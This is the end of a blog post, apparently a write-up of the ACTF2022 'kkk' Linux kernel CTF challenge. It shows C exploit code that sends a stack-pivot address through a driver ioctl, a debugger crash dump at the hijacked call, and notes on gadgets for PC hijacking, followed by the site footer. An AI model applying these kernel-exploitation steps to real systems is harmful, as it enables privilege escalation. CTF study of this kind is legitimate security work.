</span><span class="c1"></span>    <span class="n">other_arg</span><span class="p">.</span><span class="n">key</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="mh">0xaaaaaaaa</span><span class="p">;</span>
    <span class="n">other_arg</span><span class="p">.</span><span class="n">key</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="mh">0xbbbbbbbb</span><span class="p">;</span>
    <span class="c1">// this will fill in stack to help with stack pivot
</span><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pivotaddr</span> <span class="o">=</span> <span class="n">obj</span><span class="o">-&gt;</span><span class="n">keypack</span><span class="p">.</span><span class="n">ptr</span><span class="p">;</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">other_arg</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">size</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pivotaddr</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="c1">// other_arg.data.size = obj-&gt;keypack.ptr;
</span><span class="c1"></span>    <span class="n">other_arg</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="mh">0xdddddddd</span><span class="p">;</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">KKK_IOCTL_LAUNCH</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">other_arg</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">r</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;KKK_IOCTL_LAUNCH&#34;</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">leave</span><span class="p">;</span>
    <span class="p">}</span>

<span class="nl">leave</span><span class="p">:</span>
    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// OKAY we crash the kernel, the spot is like
</span><span class="c1">// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ registers â”€â”€â”€â”€
</span><span class="c1">// $rax   : 0x000000deadbeef  â†’  0x000000deadbeef
</span><span class="c1">// $rbx   : 0xffff88800530a240  â†’  0x00000000000001  â†’  0x00000000000001
</span><span class="c1">// $rcx   : 0x00000000000000  â†’  0x00000000000000
</span><span class="c1">// $rdx   : 0x00000000000001  â†’  0x00000000000001
</span><span class="c1">// $rsp   : 0xffffc900002a7e98  â†’  0xe06d573eab3d7900  â†’  0xe06d573eab3d7900
</span><span class="c1">// $rbp   : 0x00000000006b6b  â†’  0x00000000006b6b
</span><span class="c1">// $rsi   : 0x00000000006b6b  â†’  0x00000000006b6b
</span><span class="c1">// $rdi   : 0xffff888005171400  â†’  0x00000000000000  â†’  0x00000000000000
</span><span class="c1">// $rip   : 0xffffffffc00008ae  â†’  0xe86348c200272de8  â†’  0xe86348c200272de8
</span><span class="c1">// $r8    : 0x00000000000001  â†’  0x00000000000001
</span><span class="c1">// $r9    : 0x00000000000000  â†’  0x00000000000000
</span><span class="c1">// $r10   : 0xffffc900002a7ee0  â†’  0xffff888005327000  â†’  0x00000000000000  â†’  0x00000000000000
</span><span class="c1">// $r11   : 0x00000000000000  â†’  0x00000000000000
</span><span class="c1">// $r12   : 0x00000000000002  â†’  0x00000000000002
</span><span class="c1">// $r13   : 0x00000000000002  â†’  0x00000000000002
</span><span class="c1">// $r14   : 0x00000000000003  â†’  0x00000000000003
</span><span class="c1">// $r15   : 0x00000000000000  â†’  0x00000000000000
</span><span class="c1">// $eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
</span><span class="c1">// $cs: 0x10 $ss: 0x18 $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
</span><span class="c1">// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ stack â”€â”€â”€â”€
</span><span class="c1">// 0xffffc900002a7e98â”‚+0x0000: 0xe06d573eab3d7900  â†’  0xe06d573eab3d7900	 â† $rsp
</span><span class="c1">// 0xffffc900002a7ea0â”‚+0x0008: 0xffffffff829b38e8  â†’  0x00000000000000  â†’  0x00000000000000
</span><span class="c1">// 0xffffc900002a7ea8â”‚+0x0010: 0xffffc900002a7ee0  â†’  0xffff888005327000  â†’  0x00000000000000  â†’  0x00000000000000
</span><span class="c1">// 0xffffc900002a7eb0â”‚+0x0018: 0x00000000006b6b  â†’  0x00000000006b6b
</span><span class="c1">// 0xffffc900002a7eb8â”‚+0x0020: 0xffff888005327000  â†’  0x00000000000000  â†’  0x00000000000000
</span><span class="c1">// 0xffffc900002a7ec0â”‚+0x0028: 0x00000000000002  â†’  0x00000000000002
</span><span class="c1">// 0xffffc900002a7ec8â”‚+0x0030: 0xe06d573eab3d7900  â†’  0xe06d573eab3d7900
</span><span class="c1">// 0xffffc900002a7ed0â”‚+0x0038: 0xffff888005327000  â†’  0x00000000000000  â†’  0x00000000000000
</span><span class="c1">// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ code:x86:64 â”€â”€â”€â”€
</span><span class="c1">//    0xffffffffc00008a1                  test   rdi, rdi
</span><span class="c1">//    0xffffffffc00008a4                  je     0xffffffffc00007bd
</span><span class="c1">//    0xffffffffc00008aa                  mov    rax, QWORD PTR [rdi+0x28]
</span><span class="c1">// â—â†’ 0xffffffffc00008ae                  call   0xffffffff82002fe0 &lt;__x86_indirect_thunk_array&gt;
</span><span class="c1">//    â†³  0xffffffff82002fe0 &lt;__x86_indirect_thunk_array+0&gt; call   0xffffffff82002fec &lt;__x86_indirect_thunk_array+12&gt;
</span><span class="c1">//       0xffffffff82002fe5 &lt;__x86_indirect_thunk_array+5&gt; pause
</span><span class="c1">//       0xffffffff82002fe7 &lt;__x86_indirect_thunk_array+7&gt; lfence
</span><span class="c1">//       0xffffffff82002fea &lt;__x86_indirect_thunk_array+10&gt; jmp    0xffffffff82002fe5 &lt;__x86_indirect_thunk_array+5&gt;
</span><span class="c1">//       0xffffffff82002fec &lt;__x86_indirect_thunk_array+12&gt; mov    QWORD PTR [rsp], rax
</span><span class="c1">//       0xffffffff82002ff0 &lt;__x86_indirect_thunk_array+16&gt; ret
</span><span class="c1">// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ arguments (guessed) â”€â”€â”€â”€
</span><span class="c1">// __x86_indirect_thunk_array (
</span><span class="c1">//    $rdi = 0xffff888005171400 â†’ 0x00000000000000 â†’ 0x00000000000000,
</span><span class="c1">//    $rsi = 0x00000000006b6b â†’ 0x00000000006b6b,
</span><span class="c1">//    $rdx = 0x00000000000001 â†’ 0x00000000000001
</span><span class="c1">// )
</span><span class="c1">// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ threads â”€â”€â”€â”€
</span><span class="c1">// [#0] Id 1, stopped 0xffffffff81c72f9b in default_idle (), reason: BREAKPOINT
</span><span class="c1">// [#1] Id 2, stopped 0xffffffffc00008ae in ?? (), reason: BREAKPOINT
</span><span class="c1">// [#2] Id 3, stopped 0xffffffff81c72f9b in default_idle (), reason: BREAKPOINT
</span><span class="c1">// [#3] Id 4, stopped 0xffffffff810a5a36 in resched_curr (), reason: BREAKPOINT
</span><span class="c1">// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ trace â”€â”€â”€â”€
</span><span class="c1">// [#0] 0xffffffffc00008ae â†’ call 0xffffffff82002fe0 &lt;__x86_indirect_thunk_array&gt;
</span><span class="c1">// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
</span><span class="c1"></span>
<span class="c1">// Thread 2 hit Breakpoint 2, 0xffffffffc00008ae in ?? ()
</span><span class="c1"></span>
<span class="c1">// The rdi is pointing at instance (0xffff888005171400)
</span><span class="c1"></span>
<span class="c1">// about stack
</span><span class="c1">// gefâ¤  tele $rsp -l128
</span><span class="c1">// 0xffffc900002a7e98â”‚+0x0000: 0xe06d573eab3d7900  â†’  0xe06d573eab3d7900	 â† $rsp
</span><span class="c1">// 0xffffc900002a7ea0â”‚+0x0008: 0xffffffff829b38e8  â†’  0x00000000000000  â†’  0x00000000000000
</span><span class="c1">// 0xffffc900002a7ea8â”‚+0x0010: 0xffffc900002a7ee0  â†’  0xffff888005327000  â†’  0x00000000000000  â†’  0x00000000000000
</span><span class="c1">// 0xffffc900002a7eb0â”‚+0x0018: 0x00000000006b6b  â†’  0x00000000006b6b
</span><span class="c1">// 0xffffc900002a7eb8â”‚+0x0020: 0xffff888005327000  â†’  0x00000000000000  â†’  0x00000000000000
</span><span class="c1">// 0xffffc900002a7ec0â”‚+0x0028: 0x00000000000002  â†’  0x00000000000002
</span><span class="c1">// 0xffffc900002a7ec8â”‚+0x0030: 0xe06d573eab3d7900  â†’  0xe06d573eab3d7900
</span><span class="c1">// 0xffffc900002a7ed0â”‚+0x0038: 0xffff888005327000  â†’  0x00000000000000  â†’  0x00000000000000
</span><span class="c1">// 0xffffc900002a7ed8â”‚+0x0040: 0xe06d573eab3d7900  â†’  0xe06d573eab3d7900
</span><span class="c1">// 0xffffc900002a7ee0â”‚+0x0048: 0xffff888005327000  â†’  0x00000000000000  â†’  0x00000000000000	 â† $r10
</span><span class="c1">// 0xffffc900002a7ee8â”‚+0x0050: 0xffff888005327000  â†’  0x00000000000000  â†’  0x00000000000000
</span><span class="c1">// 0xffffc900002a7ef0â”‚+0x0058: 0x00000000006b6b  â†’  0x00000000006b6b
</span><span class="c1">// 0xffffc900002a7ef8â”‚+0x0060: 0x00000000000002  â†’  0x00000000000002
</span><span class="c1">// 0xffffc900002a7f00â”‚+0x0068: 0xffffffff8123e1e9  â†’  0x48b275fffffdfd3d  â†’  0x48b275fffffdfd3d
</span><span class="c1">// 0xffffc900002a7f08â”‚+0x0070: 0x00000000000000  â†’  0x00000000000000
</span><span class="c1">// 0xffffc900002a7f10â”‚+0x0078: 0xffffc900002a7f58  â†’  0x00000000000000  â†’  0x00000000000000
</span><span class="c1">// 0xffffc900002a7f18â”‚+0x0080: 0xffffc900002a7f48  â†’  0x00000000000000  â†’  0x00000000000000
</span><span class="c1">// 0xffffc900002a7f20â”‚+0x0088: 0x00000000000000  â†’  0x00000000000000
</span><span class="c1">// 0xffffc900002a7f28â”‚+0x0090: 0x00000000000000  â†’  0x00000000000000
</span><span class="c1">// 0xffffc900002a7f30â”‚+0x0098: 0x00000000000000  â†’  0x00000000000000
</span><span class="c1">// 0xffffc900002a7f38â”‚+0x00a0: 0xffffffff81c670ba  â†’  0xe8df894850438948  â†’  0xe8df894850438948
</span><span class="c1">// 0xffffc900002a7f40â”‚+0x00a8: 0x00000000000000  â†’  0x00000000000000
</span><span class="c1">// 0xffffc900002a7f48â”‚+0x00b0: 0x00000000000000  â†’  0x00000000000000
</span><span class="c1">// 0xffffc900002a7f50â”‚+0x00b8: 0xffffffff81e0007c  â†’  0x4c8b480000441f0f  â†’  0x4c8b480000441f0f
</span><span class="c1">// 0xffffc900002a7f58â”‚+0x00c0: 0x00000000000000  â†’  0x00000000000000
</span><span class="c1">// 0xffffc900002a7f60â”‚+0x00c8: 0x000000006ba018  â†’  0x00000000440dc0  â†’  0x894807e183f18948  â†’  0x894807e183f18948
</span><span class="c1">// 0xffffc900002a7f68â”‚+0x00d0: 0x00000000000000  â†’  0x00000000000000
</span><span class="c1">// 0xffffc900002a7f70â”‚+0x00d8: 0x00000000401e60  â†’  0x2b52f8058d4855  â†’  0x2b52f8058d4855
</span><span class="c1">// 0xffffc900002a7f78â”‚+0x00e0: 0x007ffc04e14e30  â†’  0x00000000401dc0  â†’  0x2b53773d8d4c5741  â†’  0x2b53773d8d4c5741
</span><span class="c1">// 0xffffc900002a7f80â”‚+0x00e8: 0x00000000400400  â†’  0xc0c74808ec8348  â†’  0xc0c74808ec8348
</span><span class="c1">// 0xffffc900002a7f88â”‚+0x00f0: 0x00000000000246  â†’  0x00000000000246
</span><span class="c1">// 0xffffc900002a7f90â”‚+0x00f8: 0x00000000000000  â†’  0x00000000000000
</span><span class="c1">// 0xffffc900002a7f98â”‚+0x0100: 0x00000000000012  â†’  0x00000000000012
</span><span class="c1">// 0xffffc900002a7fa0â”‚+0x0108: 0x00000000000000  â†’  0x00000000000000
</span><span class="c1">// 0xffffc900002a7fa8â”‚+0x0110: 0xffffffffffffffda  â†’  0xffffffffffffffda
</span><span class="c1">// 0xffffc900002a7fb0â”‚+0x0118: 0x0000000044a5e7  â†’  0x173fffff0013d48  â†’  0x173fffff0013d48
</span><span class="c1">// 0xffffc900002a7fb8â”‚+0x0120: 0x00000000000002  â†’  0x00000000000002
</span><span class="c1">// 0xffffc900002a7fc0â”‚+0x0128: 0x00000000006b6b  â†’  0x00000000006b6b
</span><span class="c1">// 0xffffc900002a7fc8â”‚+0x0130: 0x00000000000003  â†’  0x00000000000003
</span><span class="c1">// 0xffffc900002a7fd0â”‚+0x0138: 0x00000000000010  â†’  0x00000000000010
</span><span class="c1">// 0xffffc900002a7fd8â”‚+0x0140: 0x0000000044a5e7  â†’  0x173fffff0013d48  â†’  0x173fffff0013d48
</span><span class="c1">// 0xffffc900002a7fe0â”‚+0x0148: 0x00000000000033  â†’  0x00000000000033
</span><span class="c1">// 0xffffc900002a7fe8â”‚+0x0150: 0x00000000000246  â†’  0x00000000000246
</span><span class="c1">// 0xffffc900002a7ff0â”‚+0x0158: 0x007ffc04e04778  â†’  0x0000000040108b  â†’  0xbd83fffef9688589  â†’  0xbd83fffef9688589
</span><span class="c1">// 0xffffc900002a7ff8â”‚+0x0160: 0x0000000000002b  â†’  0x0000000000002b
</span><span class="c1">// 0xffffc900002a8000â”‚+0x0168: 0xffffc900002a8000
</span><span class="c1"></span>
<span class="c1">// we actually doesn&#39;t have any interesting in stack
</span><span class="c1">// https://www.usenix.org/system/files/sec19-wu-wei.pdf
</span><span class="c1">// may use this one
</span><span class="c1"></span>
<span class="c1">// PC hijacking
</span><span class="c1">// -&gt;
</span><span class="c1">// aliasing_gtt_unbind_vma (blooming gadget)
</span><span class="c1">// -&gt;
</span><span class="c1">//
</span></code></pre></td></tr></table>
</div>
</div></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2022-07-17</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/2022/07/actf2022-kkk/index.md" target="_blank">Read Markdown</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://xidoo.top/2022/07/actf2022-kkk/" data-title="ACTF2022 kkk èµ›åå¤ç°"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://xidoo.top/2022/07/actf2022-kkk/"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on WhatsApp" data-sharer="whatsapp" data-url="http://xidoo.top/2022/07/actf2022-kkk/" data-title="ACTF2022 kkk èµ›åå¤ç°" data-web><i class="fab fa-whatsapp fa-fw"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://xidoo.top/2022/07/actf2022-kkk/" data-title="ACTF2022 kkk èµ›åå¤ç°"><i data-svg-src="/lib/simple-icons/icons/line.min.svg"></i></a><a href="javascript:void(0);" title="Share on å¾®åš" data-sharer="weibo" data-url="http://xidoo.top/2022/07/actf2022-kkk/" data-title="ACTF2022 kkk èµ›åå¤ç°"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="Share on Myspace" data-sharer="myspace" data-url="http://xidoo.top/2022/07/actf2022-kkk/" data-title="ACTF2022 kkk èµ›åå¤ç°" data-description=""><i data-svg-src="/lib/simple-icons/icons/myspace.min.svg"></i></a><a href="javascript:void(0);" title="Share on Blogger" data-sharer="blogger" data-url="http://xidoo.top/2022/07/actf2022-kkk/" data-title="ACTF2022 kkk èµ›åå¤ç°" data-description=""><i class="fab fa-blogger fa-fw"></i></a><a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="http://xidoo.top/2022/07/actf2022-kkk/" data-title="ACTF2022 kkk èµ›åå¤ç°"><i class="fab fa-evernote fa-fw"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/2022/01/afl-rsc4/" class="prev" rel="prev" title="AFL æºç åˆ†æï¼ˆå®Œï¼‰å˜å¼‚è¯¦è§£"><i class="fas fa-angle-left fa-fw"></i>AFL æºç åˆ†æï¼ˆå®Œï¼‰å˜å¼‚è¯¦è§£</a>
            <a href="/2023/05/rev_main/" class="next" rel="next" title="é€†å‘æ–¹æ³•è®º">é€†å‘æ–¹æ³•è®º<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
<div id="comments"></div></article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">ğŸ´â€â˜ ï¸ Love it, Make magic</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">x1do0</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":15},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
